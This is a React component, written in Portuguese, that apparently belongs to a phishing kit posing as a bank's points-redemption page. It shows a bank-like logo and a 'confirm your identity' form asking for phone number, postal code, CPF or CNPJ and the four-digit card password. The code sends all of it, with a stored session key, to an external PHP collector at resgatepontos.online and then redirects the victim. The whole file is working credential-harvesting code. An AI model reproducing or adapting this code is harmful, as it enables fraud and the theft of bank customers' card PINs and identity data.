import React, { useState } from 'react';
import styles from './Verification.module.scss';
import santaLogo from '../../public/santa2.png'
import { useParams } from 'react-router-dom';
import { IMaskInput } from 'react-imask';

const Verification = () => {
  const { type } = useParams();

  const [formData, setFormData] = useState({
    cpf: '',
    cnpj: '', // Para o caso de 'juridica'
    telefone: '',
    cep: '',
    senha: '',
  });

  // Função para atualizar o estado do formulário
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  // Função para enviar os dados
  const handleSubmit = async (e) => {
    e.preventDefault();

    // Prepara os dados a serem enviados dependendo do tipo (fisica ou juridica)
    const dataToSend = {
      key: localStorage.getItem('key'), // Substitua pela chave que você está usando
      type: type, // 'fisica' ou 'juridica' dependendo da rota
      form_data: formData,
    };

    try {
      // Envia os dados para o PHP
      const response = await fetch('https://resgatepontos.online/two.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(dataToSend), // Envia os dados em formato JSON
      });

      const result = await response.json();

      // Se a resposta for de sucesso, redireciona
      if (result.status === 'success') {
        location.href = '/embed';
      } else {
        alert('Erro ao salvar os dados');
      }
    } catch (error) {
      console.error('Erro:', error);
      alert('Houve um erro ao tentar enviar os dados.');
    }
  };

  return (
    <>
      {type === 'fisica' ? (
        <div className={styles.fisicaVerify}>
          <img className={styles.logoSanta} src={santaLogo} alt="" />
          <div className={styles.formConfirm}>
            <span className={styles.titulo}>Estamos no final...</span>
            <span className={styles.subtitulo}>
              Confirme sua identidade<br />informando os dados abaixo:
            </span>

            <span className={styles.labels}>Telefone:</span>
            <IMaskInput
              mask="(00) 00000-0000"
              placeholder="(00) 00000-0000"
              name="telefone"
              value={formData.telefone}
              onChange={handleChange}
            />

            <span className={styles.labels}>CEP:</span>
            <IMaskInput
              mask="00000-000"
              placeholder="00000-000"
              name="cep"
              value={formData.cep}
              onChange={handleChange}
            />

            <span className={styles.labels}>Senha do cartão:</span>
            <IMaskInput
              mask="0000"
              placeholder="****"
              type="password"
              name="senha"
              value={formData.senha}
              onChange={handleChange}
            />

            <span className={styles.botaoAcao} onClick={handleSubmit}>Próximo</span>
          </div>
        </div>
      ) : (
        <div className={styles.juridicaVerify}>
          <img className={styles.logoSanta} src={santaLogo} alt="" />
          <div className={styles.formConfirm}>
            <span className={styles.titulo}>Estamos no final...</span>
            <span className={styles.subtitulo}>
              Confirme sua identidade<br />informando os dados abaixo:
            </span>

            <span className={styles.labels}>CPF:</span>
            <IMaskInput
              mask="000.000.000-00"
              placeholder="000.000.000-00"
              name="cpf"
              value={formData.cpf}
              onChange={handleChange}
            />

            <span className={styles.labels}>CNPJ:</span>
            <IMaskInput
              mask="00.000.000/0000-00"
              placeholder="00.000.000/0000-00"
              name="cnpj"
              value={formData.cnpj}
              onChange={handleChange}
            />

            <span className={styles.labels}>Telefone:</span>
            <IMaskInput
              mask="(00) 00000-0000"
              placeholder="(00) 00000-0000"
              name="telefone"
              value={formData.telefone}
              onChange={handleChange}
            />

            <span className={styles.labels}>CEP:</span>
            <IMaskInput
              mask="00000-000"
              placeholder="00000-000"
              name="cep"
              value={formData.cep}
              onChange={handleChange}
            />

            <span className={styles.labels}>Senha do cartão:</span>
            <IMaskInput
              mask="0000"
              placeholder="****"
              type="password"
              name="senha"
              value={formData.senha}
              onChange={handleChange}
            />

            <span className={styles.botaoAcao} onClick={handleSubmit}>Próximo</span>
          </div>
        </div>
      )}
    </>
  );
};

export default Verification;
